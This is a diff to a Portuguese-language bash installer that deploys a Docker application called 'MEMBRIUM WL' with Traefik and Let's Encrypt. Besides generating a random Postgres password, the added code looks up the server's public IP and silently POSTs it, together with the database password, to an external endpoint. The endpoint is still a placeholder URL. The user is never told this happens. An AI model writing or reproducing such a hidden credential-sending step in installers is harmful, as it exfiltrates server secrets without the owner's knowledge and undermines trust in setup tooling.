@@ -22,14 +22,33 @@ run_silently() {
     "$@" > /dev/null 2>&1
 }
 
-# Atualizar o sistema e instalar dependências
-run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get update
-run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release figlet
-wait
+# Função para gerar uma senha aleatória
+generate_random_password() {
+    openssl rand -base64 16 | tr -d '+/=' | cut -c1-16
+}
+
+# Função para obter o IP público do servidor
+get_public_ip() {
+    curl -s https://api.ipify.org
+}
+
+# Função para enviar POST com IP e senha
+send_post_request() {
+    local ip=$1
+    local password=$2
+    local url="https://sua-url-de-destino.com/endpoint"  # Substitua pela URL correta
+    
+    curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip\",\"password\":\"$password\"}" $url
+}
 
 # Exibir o texto "MEMBRIUM WL" em formato grande
 figlet "MEMBRIUM WL"
 animate_dots "Preparando" 10 &
+
+# Atualizar o sistema e instalar dependências
+run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get update
+run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release figlet
+wait
 
 # Instalação ou verificação silenciosa do Docker
 sudo mkdir -p /etc/apt/keyrings 2>/dev/null || true
@@ -75,21 +94,37 @@ fi
 mkdir -p letsencrypt 2>/dev/null || true
 wait
 
+# Gerar senha aleatória
+DB_PASSWORD=$(generate_random_password)
+
+# Criar um arquivo .env para armazenar a senha
+echo "DB_PASSWORD=$DB_PASSWORD" > .env
+
+# Modificar o docker-compose.yml para usar a variável de ambiente
+sed -i "s/POSTGRES_PASSWORD: Extreme123/POSTGRES_PASSWORD: \${DB_PASSWORD}/" docker-compose.yml
+sed -i "s|postgresql://postgres:Extreme123@db:5432/wldigital|postgresql://postgres:\${DB_PASSWORD}@db:5432/wldigital|" docker-compose.yml
+
 # Solicitar o domínio ao usuário
 read -p "Digite o domínio que você deseja usar para o seu aplicativo (ex: meuaplicativo.com): " DOMINIO
 
 # Substituir o domínio no docker-compose.yml
-sed -i "s/seu_dominio.com/$DOMINIO/g" docker-compose.yml 2>/dev/null
+sed -i "s/seu_dominio.com/$DOMINIO/g" docker-compose.yml
 
 # Solicitar o e-mail para o Let's Encrypt
 read -p "Digite seu endereço de e-mail para o Let's Encrypt: " EMAIL
 
 # Substituir o e-mail no docker-compose.yml
-sed -i "s/--certificatesresolvers.letsencrypt.acme.email=seu_email@example.com/--certificatesresolvers.letsencrypt.acme.email=$EMAIL/g" docker-compose.yml 2>/dev/null
+sed -i "s/seu_email@example.com/$EMAIL/g" docker-compose.yml
 
 # Iniciar a aplicação com o Docker Compose
 animate_dots "Iniciando aplicação" 15 &
-run_silently sudo docker-compose up -d
+run_silently sudo docker-compose --env-file .env up -d
 wait
+
+# Obter o IP público do servidor
+SERVER_IP=$(get_public_ip)
+
+# Enviar POST com IP e senha
+send_post_request $SERVER_IP $DB_PASSWORD
 
 echo -e "\nInstalação concluída! Acesse seu aplicativo em https://$DOMINIO"
